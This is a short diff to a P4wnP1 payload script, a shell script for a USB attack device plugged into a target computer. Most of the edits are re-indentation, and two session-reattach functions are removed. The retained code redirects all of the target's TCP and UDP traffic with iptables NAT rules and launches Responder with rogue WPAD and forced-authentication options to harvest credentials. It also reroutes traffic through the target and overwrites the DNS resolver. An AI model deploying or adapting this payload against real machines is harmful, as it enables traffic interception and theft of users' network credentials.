@@ -40,13 +40,13 @@ function onNetworkUp()
 	echo "P4wnP1 IP $IF_IP"
 	echo "P4wnP1 netmask $IF_MASK"
 
-    iptables -t nat -A PREROUTING -i $active_interface -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
+    	iptables -t nat -A PREROUTING -i $active_interface -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
 	iptables -t nat -A PREROUTING -i $active_interface -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
 
 	echo "Firewall is up to redirect traffic"
 
 	#start responder in screen
-    screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -f -v -w -F"
+    	screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -f -v -w -F"
 
 	touch /tmp/responder_started
 
@@ -60,8 +60,8 @@ function onTargetGotIP()
 	echo "DHCP Lease given to target"
 	echo "Target IP $target_ip"
 
-    # add route back through target (for ICS)
-    route add -net default gw $target_ip
+    	# add route back through target (for ICS)
+    	route add -net default gw $target_ip
 
 	# add DNS entry for google DNS
 	echo nameserver 8.8.8.8 > /etc/resolv.conf
@@ -86,16 +86,4 @@ function onKeyboardUp()
 			ENTER
 EOF
 }
-
-function onBootFinished()
-{
-    sudo screen -d -r
-}
-
-function onLogin()
-{
-	sudo screen -d -r
-
-}
-
 
